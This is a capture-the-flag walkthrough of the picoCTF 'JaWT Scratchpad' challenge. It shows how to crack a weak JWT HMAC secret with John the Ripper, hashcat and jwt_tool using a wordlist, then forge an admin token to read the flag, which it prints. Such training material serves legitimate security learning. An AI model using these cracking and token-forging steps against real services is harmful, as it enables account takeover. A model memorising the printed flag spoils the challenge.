# picoGym Level 25: JaWT Scratchpad 🧠🧠🧠
Source: https://play.picoctf.org/practice/challenge/25

## Goal
Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/58210/ or<br>
http://jupiter.challenges.picoctf.org:58210

## What I learned
```
Google Chrome has extension Cookie Editor not Microsoft Edge Browser

JWT (JSON Web Token) is a compact, URL-safe way of representing claims (pieces of information) between two parties — a client (browser) and a server (API) can find under cookie w/ Burp Suite

JWT Decoder: https://www.jwt.io/ ⭐⭐⭐⭐⭐ or CyberChef

Cookie is divided into three parts separated by a dot
    Header: base64URL encoded string
        uses HS256 algorithm
    Payload: base64URL encoded string
    Signature: need to find secret key

# Note: CrackStation Doesn't crack JWT Tokens: https://crackstation.net/ ⚠️
```

## Side Quest
```
# Method 0: Crack Token w/ John the Ripper (Solution)
# JohnTheRipper to find weak secret key
cat jwt.txt ⌨️
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSm9obiJ9.K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM
john jwt.txt --format=HMAC-SHA256 --wordlist=/home/HackerDu/downloads/rockyou.txt ⌨️❤️❤️❤️❤️❤️
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
john jwt.txt --show ⌨️❤️❤️❤️❤️❤️
?:ilovepico ❤️

1 password hash cracked, 0 left

# Method 1: Crack Token w/ hashcat (Kali Linux/ParrotOS)
# Paste jwt token into token.txt
hashcat -a0 -m 16500 token.txt rockyou.txt ⌨️❤️
# Get password
hashcat -a0 -m 16500 token.txt rockyou.txt --show ⌨️❤️

# Method 3: Crack Token w/ python3 jwt_tool (varies, Kali Linux/ParrotOS)
python3 jwt_tool.py -h ⌨️
python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt ⌨️
```

![alt text](../static/pico25.png "pico25")

## Solution
```
https://webshell.picoctf.org/

# Inspect Application Cookies
Name        Value
jwt         eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSm9obiJ9.K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM 👀

# Use Base64 to figure out what algorithm used and payload
https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUo5LmV5SjFjMlZ5SWpvaVNtOW9iaUo5LksxT21vMEdrNXNhS3dKVGtrZ1Q3UFVab2hEN1VTa25FRTBsbVQyQVlBaU0 ⌨️
    {"typ":"JWT","alg":"HS256"}{"user":"John"}+S¦£A¤æÆ.À.ä..û=Fh.>ÔJIÄ.IfO`..# 👀
AsianHacker-picoctf@webshell:~$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSm9obiJ9.K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM" | base64 -d ⌨️
{"typ":"JWT","alg":"HS256"}base64: invalid input 👀

Method 1: CyberChef
https://cyberchef.io/#recipe=JWT_Sign('ilovepico','HS256')&input=ewogICJ1c2VyIjogImFkbWluIgp9 ⌨️
Output:
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3NTY5MzI0ODZ9.BK0oaSyI3UjNBKqNlwd-hNVLAYY6BTBWRIFpEjt32qU 👀

<!doctype html>
<html>
	<title> JaWT - an online scratchpad </title>
	<link rel="stylesheet" href="/static/css/stylesheet.css">
	<body>
		<header><h1>JaWT</h1> <br> <i><small>powered by <a href="https://jwt.io/">JWT</a></small></i></header>
		<div id="main">
			<article>
				<h1>Welcome to JaWT!</h1>
				<p>
					JaWT is an online scratchpad, where you can "jot" down whatever you'd like! Consider it a notebook for your thoughts. <b style="color:blue "> JaWT works best in Google Chrome for some reason. </b>
				</p>
					<h2> Hello admin!</h2>
					<p>
						Here is your JaWT scratchpad!
					</p>
					<textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_44c752f5} 🔐</textarea>
					<br>
						<a href="/logout"><input style="width:100px" type="submit" value="Logout"></a>
				<h2> Register with your name! </h2>
				<p>
					You can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like <a href="https://github.com/magnumripper/JohnTheRipper">John</a>!
				</p>
			</article>
			<nav></nav>
			<aside></aside>		
		</div>
		<script> window.onload = function() { document.getElementById("name").focus(); }; </script>
	</body> 
</html>

Method 2: JWT.IO
# Note: Different Token than CyberChef
# Replace w/ { "user": "admin" } and Decode 1st than move to Encode
JSON WEB TOKEN
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s 👀
```

## Flag
picoCTF{jawt_was_just_what_you_thought_44c752f5}

## Continue
[Continue](./picoGym0236.md)